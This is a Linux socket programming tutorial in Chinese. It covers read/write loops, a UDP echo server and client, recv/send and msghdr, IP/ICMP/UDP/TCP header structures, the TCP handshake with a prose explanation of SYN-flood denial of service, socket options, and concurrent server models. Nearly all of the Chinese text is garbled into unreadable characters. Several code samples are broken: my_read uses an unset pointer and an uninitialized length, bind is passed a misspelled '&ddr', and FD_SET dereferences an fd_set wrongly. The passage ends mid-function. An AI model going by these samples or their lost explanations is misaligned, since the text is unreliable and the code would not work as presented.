ssize_t write(int fd,const void *buf,size_t nbytes) 
write������buf�е�nbytes�ֽ�����д���ļ�������fd.�ɹ�ʱ����д���ֽ���.ʧ��ʱ 
����-1. ������errno����. �����������,���������׽����ļ�������дʱ�����ֿ��� 
.. 
1)write�ķ���ֵ����0,��ʾд�˲��ֻ�����ȫ��������. 
2)���ص�ֵС��0,��ʱ�����˴���.����Ҫ���ݴ�������������. 
�������ΪEINTR��ʾ��д��ʱ��������жϴ���. 
���ΪEPIPE��ʾ�������ӳ���������(�Է��Ѿ��ر�������). 
Ϊ�˴������ϵ����,�����Լ���дһ��д�����������⼸�����. 
int my_write(int fd,void *buffer,int length) 
{ 
int bytes_left; 
int written_bytes; 
char *ptr; 
ptr=buffer; 
bytes_left=length; 
while(bytes_left>0) 
{ 
/* ��ʼд*/ 
written_bytes=write(fd,ptr,bytes_left); 
if(written_bytes<=0) /* ������*/ 
{ 
if(errno==EINTR) /* �жϴ��� ���Ǽ���д*/ 
written_bytes=0; 
else /* �������� û�а취,ֻ�ó�����*/ 
return(-1); 
} 
bytes_left-=written_bytes; 
ptr+=written_bytes; /* ��ʣ�µĵط�����д */ 
} 
return(0); 
} 
4.2 ������read 
ssize_t read(int fd,void *buf,size_t nbyte) read�����Ǹ����fd�ж�ȡ����.���� 
�ɹ�ʱ,read����ʵ���������ֽ���,������ص�ֵ��0 ��ʾ�Ѿ������ļ��Ľ�����,С�� 
0��ʾ�����˴���.�������ΪEINTR˵���������ж������, �����ECONNREST��ʾ���� 
���ӳ�������. ������һ��,����Ҳдһ���Լ��Ķ�����. 
int my_read(int fd,void *buffer,int length) 
{ 
int bytes_left; 
int bytes_read; 
char *ptr; 
bytes_left=length; 
while(bytes_left>0) 
{ 
bytes_read=read(fd,ptr,bytes_read); 
if(bytes_read<0) 
{ 
if(errno==EINTR) 
bytes_read=0; 
else 
return(-1); 
} 
else if(bytes_read==0) 
break; 
bytes_left-=bytes_read; 
ptr+=bytes_read; 
} 
return(length-bytes_left); 
} 
4.3 ���ݵĴ��� 
�����������������,���ǾͿ�����ͻ��˻����Ƿ���˴���������.��������Ҫ����һ 
���ṹ.����ʹ�����·�ʽ 
/* �ͻ���������д */ 
struct my_struct my_struct_client; 
write(fd,(void *)&my_struct_client,sizeof(struct my_struct); 
/* ����˵Ķ�*/ 
char buffer[sizeof(struct my_struct)]; 
struct *my_struct_server; 
read(fd,(void *)buffer,sizeof(struct my_struct)); 
my_struct_server=(struct my_struct *)buffer; 
�������ϴ�������ʱ����һ�㶼�ǰ�����ת��Ϊchar���͵����ݴ���.���յ�ʱ��Ҳ��һ 
���� ע���������û�б�Ҫ�������ϴ���ָ��(��Ϊ����ָ����û���κ������,���Ǳ� 
�봫��ָ����ָ�������) 
-- 

������(5) 

5. �û����ݱ����� 
����ǰ���Ѿ�ѧϰ��������һ���ܴ�Ĳ���,��������ֵ�֪ʶ,����ʵ���Ͽ���д�� 
�󲿷ֵĻ���TCPЭ������������.������Linux�µĴ󲿷ֳ�����������������ѧ�� 
֪ʶ��д��.���ǿ���ȥ��һЩԴ�������ο�һ��.��һ��,���Ǽ򵥵�ѧϰһ�»���UDP 
Э����������. 
5.1 �������õĺ��� 
int recvfrom(int sockfd,void *buf,int len,unsigned int flags,struct socka 
ddr * from int *fromlen) 
int sendto(int sockfd,const void *msg,int len,unsigned int flags,struct s 
ockaddr *to int tolen) 
sockfd,buf,len�������read,writeһ��,�ֱ��ʾ�׽���������,���ͻ���յĻ����� 
����С.recvfrom�����sockfd��������,���from����NULL,��ô��from����洢����Ϣ 
��Դ�����,�������Ϣ����Դ������Ȥ,���Խ�from��fromlen����ΪNULL.sendto���� 
��to������Ϣ.��ʱ��to����洢������Ϣ������ϸ����. 
5.2 һ��ʵ�� 
/* ����˳��� server.c */ 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <stdio.h> 
#include <errno.h> 
#define SERVER_PORT 8888 
#define MAX_MSG_SIZE 1024 
void udps_respon(int sockfd) 
{ 
struct sockaddr_in addr; 
int addrlen,n; 
char msg[MAX_MSG_SIZE]; 
while(1) 
{ /* �������϶�,д����������ȥ */ 
n=recvfrom(sockfd,msg,MAX_MSG_SIZE,0, 
(struct sockaddr*)&addr,&addrlen); 
msg[n]=0; 
/* ��ʾ������Ѿ��յ�����Ϣ */ 
fprintf(stdout,"I have received %s",msg); 
sendto(sockfd,msg,n,0,(struct sockaddr*)&addr,addrlen); 
} 
} 
int main(void) 
{ 
int sockfd; 
struct sockaddr_in addr; 
sockfd=socket(AF_INET,SOCK_DGRAM,0); 
if(sockfd<0) 
{ 
fprintf(stderr,"Socket Error:%s\n",strerror(errno)); 
exit(1); 
} 
bzero(&addr,sizeof(struct sockaddr_in)); 
addr.sin_family=AF_INET; 
addr.sin_addr.s_addr=htonl(INADDR_ANY); 
addr.sin_port=htons(SERVER_PORT); 
if(bind(sockfd,(struct sockaddr *)&ddr,sizeof(struct sockaddr_in))<0 
) 
{ 
fprintf(stderr,"Bind Error:%s\n",strerror(errno)); 
exit(1); 
} 
udps_respon(sockfd); 
close(sockfd); 
} 
/* �ͻ��˳��� */ 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <errno.h> 
#include <stdio.h> 
#include <unistd.h> 
#define MAX_BUF_SIZE 1024 
void udpc_requ(int sockfd,const struct sockaddr_in *addr,int len) 
{ 
char buffer[MAX_BUF_SIZE]; 
int n; 
while(1) 
{ /* �Ӽ��̶���,д������� */ 
fgets(buffer,MAX_BUF_SIZE,stdin); 
sendto(sockfd,buffer,strlen(buffer),0,addr,len); 
bzero(buffer,MAX_BUF_SIZE); 
/* �������϶�,д����Ļ�� */ 
n=recvfrom(sockfd,buffer,MAX_BUF_SIZE,0,NULL,NULL); 
buffer[n]=0; 
fputs(buffer,stdout); 
} 
} 
int main(int argc,char **argv) 
{ 
int sockfd,port; 
struct sockaddr_in addr; 
if(argc!=3) 
{ 
fprintf(stderr,"Usage:%s server_ip server_port\n",argv[0]); 
exit(1); 
} 
if((port=atoi(argv[2]))<0) 
{ 
fprintf(stderr,"Usage:%s server_ip server_port\n",argv[0]); 
exit(1); 
} 
sockfd=socket(AF_INET,SOCK_DGRAM,0); 
if(sockfd<0) 
{ 
fprintf(stderr,"Socket Error:%s\n",strerror(errno)); 
exit(1); 
} 
/* ������˵����� */ 
bzero(&addr,sizeof(struct sockaddr_in)); 
addr.sin_family=AF_INET; 
addr.sin_port=htons(port); 
if(inet_aton(argv[1],&addr.sin_addr)<0) 
{ 
fprintf(stderr,"Ip error:%s\n",strerror(errno)); 
exit(1); 
} 
udpc_requ(sockfd,&addr,sizeof(struct sockaddr_in)); 
close(sockfd); 
} 
########### �����ļ� Makefile ########## 
all:server client 
server:server.c 
gcc -o server server.c 
client:client.c 
gcc -o client client.c 
clean: 
rm -f server 
rm -f client 
rm -f core 
�����ʵ�������ұ������еĻ�,�ᷢ��һ��С�����. ���һ�������,�������з��� 
��,Ȼ�����пͻ���.�ڿͻ���������Ϣ,���͵������, �ڷ������ʾ�Ѿ��յ���Ϣ,�� 
�ǿͻ���û�з�ӳ.������һ���ͻ���,�����˷�����Ϣ ȴ���Եõ���Ӧ.��������� 
��һ���ͻ����Ѿ�������.���˭֪����ô����Ļ�,�������,лл. ����UDPЭ���ǲ� 
��֤�ɿ��������ݵ�Ҫ��,���������ڷ�����Ϣ��ʱ��,ϵͳ�����ܹ���֤���Ƿ������� 
Ϣ����ȷ����ĵ���Ŀ�ĵ�.һ�����˵�����ڱ�д��������ʱ����ѡ��TCPЭ��� 
-- 

������(6) 

6. �߼��׽��ֺ��� 
��ǰ��ļ�����������,�����Ѿ�ѧ������ô���������϶�д��Ϣ��.ǰ���һЩ����(r 
ead,write)�������������������ĺ���.Ҳ����ԭʼ��ͨ�ź���.����һ������,����һ 
����ѧϰ����ͨ�ŵĸ߼�����.��һ������ѧϰ���⼸����д����. 
6.1 recv��send 
recv��send�����ṩ�˺�read��write���Ĺ���.���������ṩ �˵��ĸ����������� 
��д����. 
int recv(int sockfd,void *buf,int len,int flags) 
int send(int sockfd,void *buf,int len,int flags) 
ǰ�������������read,writeһ��,���ĸ�����������0���������µ���� 
_______________________________________________________________ 
| MSG_DONTROUTE | ������·�ɱ� | 
| MSG_OOB | ���ܻ��߷��ʹ������� | 
| MSG_PEEK | �鿴����,������ϵͳ�������������� | 
| MSG_WAITALL | �ȴ��������� | 
|--------------------------------------------------------------| 
MSG_DONTROUTE:��send����ʹ�õı�־.�����־����IPЭ��.Ŀ�������ڱ����������� 
,û�б�Ҫ����·�ɱ�.�����־һ����������Ϻ�·�ɳ�������. 
MSG_OOB:��ʾ���Խ��պͷ��ʹ��������.���ڴ������������Ժ����͵�. 
MSG_PEEK:��recv������ʹ�ñ�־,��ʾֻ�Ǵ�ϵͳ�������ж�ȡ����,�������ϵͳ���� 
��������.�����´ζ���ʱ��,��Ȼ��һ��������.һ�����ж�����̶�д����ʱ����ʹ�� 
�����־. 
MSG_WAITALL��recv������ʹ�ñ�־,��ʾ�ȵ����е���Ϣ����ʱ�ŷ���.ʹ�������־�� 
ʱ��recv��һֱ����,ֱ��ָ������������,�����Ƿ����˴���. 1)��������ָ�����ֽ� 
ʱ,������������.����ֵ����len 2)���������ļ��Ľ�βʱ,������������.����ֵС�� 
len 3)��������������ʱ,����-1,�����ô���Ϊ��Ӧ�Ĵ����(errno) 
���flagsΪ0,���read,writeһ���Ĳ���.���������ļ���ѡ��,��������ʵ�����õĺ� 
��,���Բ鿴 Linux Programmer's Manual�õ���ϸ����. 
6.2 recvfrom��sendto 
����������һ�����ڷ��׽��ֵ����������(UDP),�����Ѿ���ǰ��ѧ����. 
6.3 recvmsg��sendmsg 
recvmsg��sendmsg����ʵ��ǰ�����еĶ�д�����Ĺ���. 
int recvmsg(int sockfd,struct msghdr *msg,int flags) 
int sendmsg(int sockfd,struct msghdr *msg,int flags) 
struct msghdr 
{ 
void *msg_name; 
int msg_namelen; 
struct iovec *msg_iov; 
int msg_iovlen; 
void *msg_control; 
int msg_controllen; 
int msg_flags; 
} 
struct iovec 
{ 
void *iov_base; /* ��������ʼ�ĵ�ַ */ 
size_t iov_len; /* �������ĳ��� */ 
} 
msg_name�� msg_namelen���׽����Ƿ���������ʱ(UDP),���Ǵ洢���պͷ��ͷ��ĵ�ַ 
��Ϣ.msg_nameʵ������һ��ָ��struct sockaddr��ָ��,msg_name�ǽṹ�ĳ���.���� 
��������������ʱ,������ֵӦ��ΪNULL. msg_iov��msg_iovlenָ�����ܺͷ��͵Ļ��� 
������.msg_iov��һ���ṹָ��,msg_iovlenָ������ṹ����Ĵ�С. msg_control�� 
msg_controllen�������������������պͷ��Ϳ�������ʱ�� msg_flagsָ�����ܺͷ��� 
�Ĳ���ѡ��.��recv,send��ѡ��һ�� 
6.4 �׽��ֵĹر� 
�ر��׽�������������close��shutdown.��closeʱ�����ǹر��ļ�һ��. 
6.5 shutdown 
int shutdown(int sockfd,int howto) 
TCP������˫���(�ǿɶ�д��),������ʹ��closeʱ,��Ѷ�дͨ�����ر�,��ʱ������ϣ 
��ֻ�ر�һ������,���ʱ�����ǿ���ʹ��shutdown.��Բ�ͬ��howto,ϵͳ�ز�ȡ��ͬ 
�Ĺرշ�ʽ. 
howto=0���ʱ��ϵͳ��رն�ͨ��.���ǿ��Լ���������������д. 
howto=1�ر�дͨ��,�������෴,��ʱ���ֻ���Զ���. 
howto=2�رն�дͨ��,��closeһ�� �ڶ���̳�������,����м����ӽ��̹���һ���׽� 
��ʱ,�������ʹ��shutdown, ��ô���е��ӽ��̶����ܹ�������,���ʱ������ֻ�ܹ� 
ʹ��close���ر��ӽ��̵��׽���������. 



������(7) 

7. TCP/IPЭ�� 
��Ҳ����˵��TCP/IPЭ��,��ô��֪������ʲô��TCP,ʲô��IP��?����һ������,����һ 
����ѧϰ���Ŀǰ����������㷺��Э��. 
7.1 ���紫��ֲ� 
����㿼��������ȼ�����,��ô���Ӧ���Ѿ�֪�������紫��ֲ��������.�������� 
,����Ϊ�˴�������ʱ�ķ���,������Ĵ����Ϊ7�����.�ֱ���:Ӧ�ò�,��ʾ��,�Ự�� 
,�����,�����,������·��������.�ֺ��˲��Ժ�,��������ʱ,��һ�����Ҫ���ݵ� 
��,�Ϳ���ֱ������һ��Ҫ��,������Ҫ�����ݴ����ϸ��.��һ��Ҳֻ��������һ���ṩ 
����,����Ҫȥ������������.����㲻�뿼��,��û�б�Ҫȥ����Щ������.ֻҪ֪���� 
�ֲ��,���Ҹ�������ò�ͬ. 
7.2 IPЭ�� 
IPЭ������������Э��.����Ҫ������ݰ��ķ�������. �����������IP4�����ݰ��� 
ʽ 
0 4 8 16 32 
-------------------------------------------------- 
|�汾 |�ײ�����|��������| ���ݰ��ܳ� | 
-------------------------------------------------- 
| ��ʶ |DF |MF| ��Ƭƫ�� | 
-------------------------------------------------- 
| ����ʱ�� | Э�� | �ײ������ | 
------------------------------------------------ 
| ԴIP��ַ | 
------------------------------------------------ 
| Ŀ��IP��ַ | 
------------------------------------------------- 
| ѡ�� | 
================================================= 
| ���� | 
------------------------------------------------- 
�������ǿ�һ��IP�Ľṹ����<netinet/ip.h> 
struct ip 
{ 
#if __BYTE_ORDER == __LITTLE_ENDIAN 
unsigned int ip_hl:4; /* header length */ 
unsigned int ip_v:4; /* version */ 
#endif 
#if __BYTE_ORDER == __BIG_ENDIAN 
unsigned int ip_v:4; /* version */ 
unsigned int ip_hl:4; /* header length */ 
#endif 
u_int8_t ip_tos; /* type of service */ 
u_short ip_len; /* total length */ 
u_short ip_id; /* identification */ 
u_short ip_off; /* fragment offset field */ 
#define IP_RF 0x8000 /* reserved fragment flag */ 
#define IP_DF 0x4000 /* dont fragment flag */ 
#define IP_MF 0x2000 /* more fragments flag */ 
#define IP_OFFMASK 0x1fff /* mask for fragmenting bits */ 
u_int8_t ip_ttl; /* time to live */ 
u_int8_t ip_p; /* protocol */ 
u_short ip_sum; /* checksum */ 
struct in_addr ip_src, ip_dst; /* source and dest address */ 
}; 
ip_vIPЭ��İ汾��,������4,����IPV6�Ѿ������� 
ip_hlIP���ײ�����,���ֵ��4�ֽ�Ϊ��λ.IPЭ���ײ��Ĺ̶�����Ϊ20���ֽ�,���IP�� 
û��ѡ��,��ô���ֵΪ5. 
ip_tos��������,˵���ṩ������Ȩ. 
ip_len˵��IP���ݵĳ���.���ֽ�Ϊ��λ. 
ip_id��ʶ���IP���ݰ�. 
ip_off��Ƭƫ��,�������IDһ������������Ƭ��. 
ip_ttl����ʱ��.û����һ��·�ɵ�ʱ���һ,ֱ��Ϊ0ʱ������. 
ip_pЭ��,��ʾ�������IP���ݰ��ĸ߲�Э��.��TCP,UDPЭ��. 
ip_sum�ײ�У���,�ṩ���ײ����ݵ�У��. 
ip_src,ip_dst�����ߺͽ����ߵ�IP��ַ 
����IPЭ�����ϸ���,��ο� RFC791 
7.3 ICMPЭ�� 
ICMP����Ϣ����Э��,Ҳ���������.�������ϴ���IP���ݰ�ʱ,��������˴���,��ô�� 
����ICMPЭ�����������. 
ICMP���Ľṹ����: 
0 8 16 32 
--------------------------------------------------------------------- 
| ���� | ���� | У��� | 
-------------------------------------------------------------------- 
| ���� | ���� | 
-------------------------------------------------------------------- 
ICMP��<netinet/ip_icmp.h>�еĶ����� 
struct icmphdr 
{ 
u_int8_t type; /* message type */ 
u_int8_t code; /* type sub-code */ 
u_int16_t checksum; 
union 
{ 
struct 
{ 
u_int16_t id; 
u_int16_t sequence; 
} echo; /* echo datagram */ 
u_int32_t gateway; /* gateway address */ 
struct 
{ 
u_int16_t __unused; 
u_int16_t mtu; 
} frag; /* path mtu discovery */ 
} un; 
}; 
����ICMPЭ�����ϸ������Բ鿴 RFC792 
7.4 UDPЭ�� 
UDPЭ���ǽ�����IPЭ�����֮�ϵ�,���ڴ�����Э��.UDP��IPЭ��һ���ǲ��ɿ����� 
�ݱ�����.UDP��ͷ��ʽΪ: 
0 16 32 
--------------------------------------------------- 
| UDPԴ�˿� | UDPĿ�Ķ˿� | 
--------------------------------------------------- 
| UDP���ݱ����� | UDP���ݱ�У�� | 
--------------------------------------------------- 
UDP�ṹ��<netinet/udp.h>�еĶ���Ϊ: 
struct udphdr { 
u_int16_t source; 
u_int16_t dest; 
u_int16_t len; 
u_int16_t check; 
}; 
����UDPЭ�����ϸ���,��ο� RFC768 
7.5 TCP 
TCPЭ��Ҳ�ǽ�����IPЭ��֮�ϵ�,����TCPЭ���ǿɿ���.����˳���͵�.TCP�����ݽ� 
����ǰ��Ľṹ��Ҫ����. 
0 4 8 10 16 24 32 
------------------------------------------------------------------- 
| Դ�˿� | Ŀ�Ķ˿� | 
------------------------------------------------------------------- 
| ���к� | 
------------------------------------------------------------------ 
| ȷ�Ϻ� | 
------------------------------------------------------------------ 
| | |U|A|P|S|F| | 
|�ײ�����| ���� |R|C|S|Y|I| ���� | 
| | |G|K|H|N|N| | 
----------------------------------------------------------------- 
| У��� | ����ָ�� | 
----------------------------------------------------------------- 
| ѡ�� | ����ֽ� | 
----------------------------------------------------------------- 
TCP�Ľṹ��<netinet/tcp.h>�ж���Ϊ: 
struct tcphdr 
{ 
u_int16_t source; 
u_int16_t dest; 
u_int32_t seq; 
u_int32_t ack_seq; 
#if __BYTE_ORDER == __LITTLE_ENDIAN 
u_int16_t res1:4; 
u_int16_t doff:4; 
u_int16_t fin:1; 
u_int16_t syn:1; 
u_int16_t rst:1; 
u_int16_t psh:1; 
u_int16_t ack:1; 
u_int16_t urg:1; 
u_int16_t res2:2; 
#elif __BYTE_ORDER == __BIG_ENDIAN 
u_int16_t doff:4; 
u_int16_t res1:4; 
u_int16_t res2:2; 
u_int16_t urg:1; 
u_int16_t ack:1; 
u_int16_t psh:1; 
u_int16_t rst:1; 
u_int16_t syn:1; 
u_int16_t fin:1; 
#endif 
u_int16_t window; 
u_int16_t check; 
u_int16_t urg_prt; 
}; 
source����TCP���ݵ�Դ�˿� 
dest����TCP���ݵ�Ŀ�Ķ˿� 
seq��ʶ��TCP�������������ֽڵĿ�ʼ���к� 
ack_seqȷ�����к�,��ʾ���ܷ���һ�ν��ܵ��������к�. 
doff�����ײ�����.��IPЭ��һ��,��4�ֽ�Ϊ��λ.һ���ʱ��Ϊ5 
urg������ý�������ָ��,���λΪ1 
ack���ȷ�Ϻ���ȷ,��ôΪ1 
psh�������Ϊ1,��ô���շ��յ����ݺ�,����������һ����� 
rstΪ1��ʱ��,��ʾ������������ 
synΪ1��ʱ��,��ʾ���������� 
finΪ1��ʱ��,��ʾ���ݹر����� 
window����,���߽����߿��Խ��յĴ�С 
check��TCP���ݽ��нϺ� 
urg_ptr���urg=1,��ôָ���������ݶ�����ʷ���ݿ�ʼ�����кŵ�ƫ��ֵ 
����TCPЭ�����ϸ���,��鿴 RFC793 
7.6 TCP���ӵĽ��� 
TCPЭ����һ�ֿɿ�������,Ϊ�˱�֤���ӵĿɿ���,TCP������Ҫ��Ϊ��������.���ǰ��� 
�����ӹ��̳�Ϊ"��������". 
�������Ǵ�һ��ʵ���������������ӵĹ���. 
��һ���ͻ��������������һ��TCP���ݰ�,��ʾ����������. Ϊ��,�ͻ��˽����ݰ��� 
SYNλ����Ϊ1,�����������к�seq=1000(���Ǽ���Ϊ1000). 
�ڶ����������յ������ݰ�,����SYNλΪ1֪������һ���������������.���Ƿ�����Ҳ 
��ͻ��˷���һ��TCP���ݰ�.��Ϊ����Ӧ�ͻ���������,���Ƿ���������ACKΪ1,sak_se 
q=1001(1000+1)ͬʱ�����Լ������к�.seq=2000(���Ǽ���Ϊ2000). 
�������ͻ����յ��˷�������TCP,����ACKΪ1��ack_seq=1001֪���Ǵӷ���������ȷ�� 
��Ϣ.���ǿͻ���Ҳ�����������ȷ����Ϣ.�ͻ�������ACK=1,��ack_seq=2001,seq=100 
1,���͸�������.���˿ͻ����������. 
���һ���������ܵ�ȷ����Ϣ,Ҳ�������. 
ͨ�����漸������,һ��TCP���Ӿͽ�����.��Ȼ�ڽ��������п��ܳ��ִ���,����TCPЭ�� 
���Ա�֤�Լ�ȥ��������. 
˵һ˵���е�һ�ִ���. 
��˵��DOS��?(�ɲ��ǲ���ϵͳ��).���괺�ڵ�ʱ��,�����������վһ���ܵ�����.�� 
�����õľ���DOS(�ܾ�ʽ����)��ʽ.������˵һ��ԭ��. 
�ͻ����Ƚ��е�һ������.�������յ���,���еڶ�������.����������TCP����,�ͻ��� 
Ӧ�ý��е���������. 
����������ʵ���ϲ������е���������.��Ϊ�ͻ����ڽ��е�һ�������ʱ��,�޸����� 
����IP��ַ,����˵��һ��ʵ���ϲ����ڵ�IP������Լ�IP���ݰ��ķ����ߵ�IPһ��.�� 
����Ϊ����������IP��ַû���˽���,���Է���˻��ղ��������������ȷ���ź�,���� 
������˻����Ǳ�һֱ�ȴ�,ֱ����ʱ. 
�������д����Ŀͻ����������,����˻��д����ȴ�,ֱ�����е���Դ���ù�,�������� 
���տͻ���������. 
�������������û����������������ʱ,����û������Դ�����ܳɹ�.���Ǿͳ����˴��� 
ʱ�����ֵ����. 
---------------------------------------------------------------------------- 

������(8) 

8. �׽���ѡ�� 
��ʱ������Ҫ�����׽��ֵ���Ϊ(���޸Ļ������Ĵ�С),���ʱ�����Ǿ�Ҫ�����׽��ֵ� 
ѡ����. 
8.1 getsockopt��setsockopt 
int getsockopt(int sockfd,int level,int optname,void *optval,socklen_t *optl 
en) 
int setsockopt(int sockfd,int level,int optname,const void *optval,socklen_t 
*optlen) 
levelָ�������׽��ֵĲ��.����ȡ����ֵ: 1)SOL_SOCKET:ͨ���׽���ѡ��. 2)IPPRO 
TO_IP:IPѡ��. 3)IPPROTO_TCP:TCPѡ��. 
optnameָ�����Ƶķ�ʽ(ѡ�������),����������ϸ���� 
optval��û����������׽���ѡ��.����ѡ�����Ƶ��������ͽ���ת�� 
ѡ������ ˵�� �������� 
======================================================================== 
SOL_SOCKET 
------------------------------------------------------------------------ 
SO_BROADCAST �����͹㲥���� int 
SO_DEBUG ������� int 
SO_DONTROUTE ������·�� int 
SO_ERROR ����׽��ִ��� int 
SO_KEEPALIVE �������� int 
SO_LINGER �ӳٹر����� struct linge 
r 
SO_OOBINLINE �������ݷ������������� int 
SO_RCVBUF ���ջ�������С int 
SO_SNDBUF ���ͻ�������С int 
SO_RCVLOWAT ���ջ��������� int 
SO_SNDLOWAT ���ͻ��������� int 
SO_RCVTIMEO ���ճ�ʱ struct timev 
al 
SO_SNDTIMEO ���ͳ�ʱ struct timev 
al 
SO_REUSERADDR �������ñ��ص�ַ�Ͷ˿� int 
SO_TYPE ����׽������� int 
SO_BSDCOMPAT ��BSDϵͳ���� int 
========================================================================== 
IPPROTO_IP 
-------------------------------------------------------------------------- 
IP_HDRINCL �����ݰ��а���IP�ײ� int 
IP_OPTINOS IP�ײ�ѡ�� int 
IP_TOS �������� 
IP_TTL ����ʱ�� int 
========================================================================== 
IPPRO_TCP 
-------------------------------------------------------------------------- 
TCP_MAXSEG TCP������ݶεĴ�С int 
TCP_NODELAY ��ʹ��Nagle�㷨 int 
========================================================================= 
������Щѡ�����ϸ�����鿴 Linux Programmer's Manual 
8.2 ioctl 
ioctl���Կ������е��ļ������������,�������һ�¿����׽��ֵ�ѡ��. 
int ioctl(int fd,int req,...) 
========================================================================== 
ioctl�Ŀ���ѡ�� 
-------------------------------------------------------------------------- 
SIOCATMARK �Ƿ񵽴������ int 
FIOASYNC �첽����/�����־ int 
FIONREAD �������ɶ����ֽ��� int 
========================================================================== 
��ϸ��ѡ������ man ioctl_list �鿴. 
-- 

������(9) 

9. ������ģ�� 
ѧϰ����������̡���.������̿���ÿһ������Ա"����"�Ŀγ̰�.�����û��ѧϰ�� 
, ������ȥ��һ��. ����һ������,����һ������������̵ĽǶ�ѧϰ�����̵�˼��. 
������д����֮ǰ, ���Ƕ�Ӧ�ô�������̵ĽǶȹ滮�����ǵ����,�������ǿ������ 
��Ч�ʲŻ��. �������������,һ�����˵�������ͻ�����Ӧһ��������.Ϊ�˴��� 
�ͻ���������, �Է���˵ĳ��������������Ҫ��.����ѧϰһ��Ŀǰ��õķ����� 
ģ��. 
ѭ��������:ѭ����������ͬһ��ʱ��ֻ������Ӧһ���ͻ��˵����� 
����������:������������ͬһ��ʱ�̿�����Ӧ����ͻ��˵����� 
9.1 ѭ��������:UDP������ 
UDPѭ����������ʵ�ַǳ���:UDP������ÿ�δ��׽����϶�ȡһ���ͻ��˵�����,���� 
, Ȼ�󽫽�����ظ��ͻ���. 
������������㷨��ʵ��. 
socket(...); 
bind(...); 
while(1) 
{ 
recvfrom(...); 
process(...); 
sendto(...); 
} 
��ΪUDP�Ƿ��������ӵ�,û��һ���ͻ��˿�������ռס�����. ֻҪ������̲�����ѭ 
��, ����������ÿһ���ͻ��������������ܹ�����. 
9.2 ѭ��������:TCP������ 
TCPѭ����������ʵ��Ҳ����:TCP����������һ���ͻ��˵�����,Ȼ����,���������� 
�������������,�Ͽ�����. 
�㷨����: 
socket(...); 
bind(...); 
listen(...); 
while(1) 
{ 
accept(...); 
while(1) 
{ 
read(...); 
process(...); 
write(...); 
} 
close(...); 
} 
TCPѭ��������һ��ֻ�ܴ���һ���ͻ��˵�����.ֻ��������ͻ����������������, 
�������ſ��Լ������������.���������һ���ͻ���ռס����������ʱ,�����Ŀͻ��� 
�����ܹ�����.���,TCP������һ�������ѭ��������ģ�͵�. 
9.3 ����������:TCP������ 
Ϊ���ֲ�ѭ��TCP��������ȱ��,����������˲�����������ģ��. ������������˼���� 
ÿһ���ͻ��������󲢲��ɷ�����ֱ�Ӵ���,���Ƿ���������һ�� �ӽ���������. 
�㷨����: 
socket(...); 
bind(...); 
listen(...); 
while(1) 
{ 
	accept(...); 
	if(fork(..)==0) 
	{ 
		while(1) 
		{ 
			read(...); 
			process(...); 
			write(...); 
		} 
		close(...); 
		exit(...); 
	} 
	close(...); 
} 
TCP�������������Խ��TCPѭ���������ͻ�����ռ�����������. ����Ҳͬʱ������һ 
����С������.Ϊ����Ӧ�ͻ���������,������Ҫ�����ӽ���������. �������ӽ�����һ 
�ַǳ�������Դ�Ĳ���. 
9.4 ����������:��·����I/O 
Ϊ�˽�������ӽ��̴�����ϵͳ��Դ����,����������˶�·����I/Oģ��. 
���Ƚ���һ������select 
int select(int nfds,fd_set *readfds,fd_set *writefds, 
fd_set *exceptfds,struct timeval *timeout) 
void FD_SET(int fd,fd_set *fdset) 
void FD_CLR(int fd,fd_set *fdset) 
void FD_ZERO(fd_set *fdset) 
int FD_ISSET(int fd,fd_set *fdset) 
һ�����˵�����������ļ���дʱ,�����п����ڶ�д������,ֱ��һ������������. �� 
�����Ǵ�һ���׽��ֶ�����ʱ,���ܻ���������û�����ݿɶ�(ͨ�ŵĶԷ���û�� ������ 
�ݹ���),���ʱ�����ǵĶ����þͻ�ȴ�(����)ֱ�������ݿɶ�.������ǲ� ϣ������ 
,���ǵ�һ��ѡ������selectϵͳ����. ֻҪ�������ú�select�ĸ�������,��ô���ļ� 
���Զ�д��ʱ��select��"֪ͨ"���� ˵���Զ�д��. readfds����Ҫ�����ļ��ļ����� 
���ļ��� 
writefds����Ҫ��д�ļ��ļ��������ļ��� 
exceptfds�����ķ�Ҫ������֪ͨ���ļ������� 
timeout��ʱ����. 
nfds�������Ǽ�ص��ļ���������������һ����1 
�����ǵ���selectʱ���̻�һֱ����ֱ�����µ�һ���������. 1)���ļ����Զ�.2)���� 
������д.3)��ʱ�����õ�ʱ�䵽. 
Ϊ�������ļ�����������Ҫʹ�ü�����. 
FD_SET��fd���뵽fdset 
FD_CLR��fd��fdset������� 
FD_ZERO��fdset��������е��ļ������� 
FD_ISSET�ж�fd�Ƿ���fdset������ 
ʹ��select��һ������ 
int use_select(int *readfd,int n) 
{ 
	fd_set my_readfd; 
	int maxfd; 
	int i; 
	maxfd = readfd[0]; 
	for(i = 1;i<n;i++) 
	if(readfd[i] > maxfd) maxfd=readfd[i]; 
	while(1){ 
		/* �����е��ļ����������� */ 
		FD_ZERO(&my_readfd); 
		for(i=0;i<n;i++) 
		FD_SET(readfd[i],*my_readfd); 
		/* �������� */ 
		select(maxfd+1,& my_readfd,NULL,NULL,NULL); 
		/* �ж������Զ��� */ 
		for(i=0;i<n;i++) 
		if(FD_ISSET(readfd[i],&my_readfd)){ 
			/* ԭ�����ҿ��Զ��� */ 
			we_read(readfd[i]); 
		} 
	} 
} 
ʹ��select�����ǵķ���������ͱ����. 
��ʼ��(socket,bind,listen); 
while(1) 
{ 
���ü�����д�ļ�������(FD_*); 
����select; 
����������׽��־���,˵��һ���µ����������� 
{ 
��������(accept); 
���뵽�����ļ���������ȥ; 
} 
����˵����һ���Ѿ����ӹ��������� 
{ 
���в���(read����write); 
} 
} 
��·����I/O���Խ����Դ���Ƶ�����.��ģ��ʵ�����ǽ�UDPѭ��ģ��������TCP����. 
��Ҳ�ʹ�����һЩ����.�����ڷ��������δ���ͻ�������,���Կ��ܻᵼ���еĿͻ� �� 
�ȴ��ܾ�. 
9.5 ����������:UDP������ 
���ǰѲ����ĸ�������UDP�͵õ��˲���UDP������ģ��. ����UDP������ģ����ʵ�Ǽ� 
��.�Ͳ�����TCP������ģ��һ���Ǵ���һ���ӽ���������� �㷨�Ͳ�����TCPģ��һ�� 
.. 
���Ƿ������ڴ���ͻ��˵��������õ�ʱ��Ƚϳ�����,����ʵ���Ϻ���������ģ��. 
9.6 һ������TCP������ʵ�� 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <netinet/in.h> 
#include <string.h> 
#include <errno.h> 
#define MY_PORT 8888 
int main(int argc ,char **argv) 
{ 
int listen_fd,accept_fd; 
struct sockaddr_in client_addr; 
int n; 
